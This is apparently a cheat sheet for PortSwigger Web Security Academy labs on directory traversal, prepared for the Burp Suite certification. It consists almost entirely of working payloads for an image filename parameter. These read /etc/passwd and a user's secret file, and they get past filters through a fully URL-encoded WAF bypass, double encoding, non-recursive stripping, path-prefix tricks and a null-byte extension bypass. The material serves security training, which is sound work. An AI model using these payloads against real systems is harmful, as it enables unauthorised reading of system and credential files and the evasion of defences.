## Approach
If you can get /etc/passwd, but cannot get /home/carlos/secret (maybe WAF is blocking the word **secret**), just URL-Encode the whole payload (even with /home/carlos/secret) like this:
```
/image?filename=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```
   
> Arises at **/image?filename=**  
Turn on images inspection in proxy setting to easily detect this type
> https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#directory-traversal

## Labs PortSwigger
### 1. File path traversal, traversal sequences blocked with absolute path bypass
```
/image?filename=/etc/passwd
```

### 2. File path traversal, traversal sequences stripped non-recursively
```
/image?filename=..././..././..././etc/passwd
```

### 3. File path traversal, traversal sequences stripped with superfluous URL-decode
```
Double URL-encode ../../../etc/passwd
(e.g. %252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd)
It is recommended to use cyberchef to encode
```

### 4. File path traversal, validation of start of path
```
/image?filename=/var/www/images/../../../../etc/passwd
```

### 5. File path traversal, validation of file extension with null byte bypass
```
../../../../../../etc/passwd%00.jpg
```
